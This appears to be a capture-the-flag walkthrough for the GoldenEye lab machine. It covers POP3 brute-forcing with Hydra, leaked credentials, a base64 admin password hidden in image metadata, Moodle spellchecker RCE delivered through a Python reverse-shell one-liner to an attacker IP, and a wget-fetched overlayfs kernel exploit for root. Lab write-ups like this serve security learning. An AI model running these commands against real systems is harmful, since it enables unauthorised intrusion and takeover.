# Walkthrough: GoldenEye CTF

---

## Initial Enumeration & POP3 Access

### 1. Network Reconnaissance (`Nmap`)
Run a quick service scan against the target IP to discover exposed services:

```bash
nmap -sC -sV -oN nmap_initial.txt <TARGET-IP>

```

Discovered Open Ports:

    21/tcp: FTP

    22/tcp: SSH

    80/tcp: HTTP (Apache web server)

    55007/tcp: POP3

### 2. Web & Directory Enumeration
    
1. Access http://<TARGET-IP>/ in a browser and inspect the HTML page source.

2. Search for hidden comments, subdirectories, or potential usernames (e.g., boris, natalya, knut).
   
3. Brute-force POP3 logins using discovered usernames against port 55007.

### 3. POP3 Brute-Forcing (boris / natalya)

Use Hydra or Medusa to crack credentials for POP3 users:
```bash
hydra -l natalya -P /usr/share/wordlists/rockyou.txt <TARGET-IP> -s 55007 pop3
```

## Moodle Access & Secondary POP3 Enumeration

### 4. POP3 Mail Enumeration (natalya)

Connect via POP3 to inspect Natalya's emails:

Message 1: Mentions supervisor details and warns about the crime syndicate Janus.

Message 2: Contains credentials for xenia and internal routing instructions:

 ```bash 
 Username: xenia
 password: RCP90rulez!
 Internal Domain Endpoint: severnaya-station.com/gnocertdir
 ```

### 5. Local DNS Resolution (/etc/hosts)

Add the local domain entry to /etc/hosts so your browser can resolve the internal path
```bash 
sudo vim /etc/hosts
```

Append entry:
```bash 
<TARGET-IP> severnaya-station.com
```

### 6. Moodle Portal Access & Secondary POP3 Crack

1. Navigate to http://severnaya-station.com/gnocertdir/ in your browser.
2. Log in with Xenia's credentials (xenia / RCP90rulez!).
3. Inspecting internal messages/profile reveals contact with Dr Doak.
4. Use Hydra to brute-force POP3 credentials for user doak:

```bash
hydra -l doak -P /usr/share/set/src/fasttrack/wordlist.txt <TARGET-IP> -s 55007 pop3
```

Discovered POP3 Credentials (doak):

```bash
    Username: doak
    Password: goat
```

### 7. Moodle Login (dr_doak) & Private Files Exploration

1. Log into POP3 (doak / goat) via telnet or nc to inspect email contents:
    Retrieved Web Credentials:
    Username: ```dr_doak```
    Password: ```4England!```

2. Log into the Moodle platform as ```dr_doak```.
3. Access My profile $\rightarrow$ My private files to find:
    Folder: ```for james```
    File: ```s3cret.txt```

---    

## Steganography & Administrative RCE
### 8. Extracting Admin Credentials via Steganography

1. Reading ```s3cret.txt```:
    The file inside Dr. Doak's private files contains a note referencing an image at ```/dir007key/for-007.jpg```.

2. Inspecting Metadata:
    Download and run ```exiftool``` on ```for-007.jpg``` to discover a Base64-encoded string hidden in the Image Description field:

```eFdpbnRlclJjcjE5OTVXIQ==```

3. Decoding the Base64 String:

```bash
echo eFdpbnRlclJjcjE5OTVXIQ== | base64 -d
```
Decoded Admin Password: ```xWinter1995x!```

### 9. Moodle Administration & RCE Execution

   1. Admin Login:
        Log into the Moodle instance (/gnocertdir/login/index.php) using:
        Username: ```admin```
        Password: ```xWinter1995x!```

   2. Configuring the Spellchecker Exploit (TinyMCE RCE):
          Navigate to Site Administration $\rightarrow$ Editor settings / TinyMCE HTML editor $\rightarrow$ Spellcheck settings.
          Set the Spell engine to PSpellShell.
          In the Path to aspell field, input a reverse shell command targeting your local listener IP and port:

```bash 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER-IP>",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Click Save changes.

   3. Triggering the Reverse Shell:
        Start a Netcat listener on your Kali machine:
        ```bash
    nc -lvnp 443
    ```

Create a new blog post via My profile $\rightarrow$ Blogs $\rightarrow$ Add a new entry.

Type text into the body editor and trigger the spellcheck functionality, executing the payload defined in the aspell path.
   
   4. Shell Caught:The shell connects back, granting execution as www-data:

      ```bash
      uid=33(www-data) gid=33(www-data) groups=33(www-data)    
      pwd: /var/www/html/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker
      ```

---

## Root Privilege Escalation
### 10. Target System Reconnaissance
After obtaining the shell, enumerate the OS and kernel version:
```bash
            uname -a
```
Output:
        
```bash 
            Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

### 11. Exploit Execution: overlayfs (CVE-2015-1328)

The target running Ubuntu with Kernel ```3.13.0-32``` is vulnerable to the overlayfs local privilege escalation exploit (Exploit-DB ID: ```37292```).
1.Host Attacker Web Server:
    Serve the exploit C code (```37292.c```) using Python on your Kali machine:
    
```bash 
            python3 -m http.server 8081
```

2. Download Exploit to Target:
Navigate to the world-writable ```/tmp``` directory on the victim host and fetch the file:

    ```bash
           cd /tmp
           wget http://<ATTACKER-IP>:8081/37292.c
       ```

4. Compile Exploit:
Replace standard compiler flags if needed and compile:

    ```bash
           sed -i "s/gcc/cc/g" 37292.c
           cc 37292.c -o exploited
       ```

5. Execute Exploit:
Run the binary to escalate privileges to root:

    ```bash
           ./exploited
       ```

### 12. Root Access & Flag Retrieval

1. Verify Root Privileges:

    ```bash
               id
               Output: uid=0(root) gid=0(root) groups=0(root)
        ```

3. Read Hidden Root Flag:

    ```bash
               cat /root/.flag.txt
       ```

Contents of ```.flag.txt```:
        ```bash 
            
             Alec told me to place the codes here:
            
            568628e0d993b1973adc718237da6e93
            
            If you captured this make sure to go here.....
            /006-final/xvf7-flag/
        ```
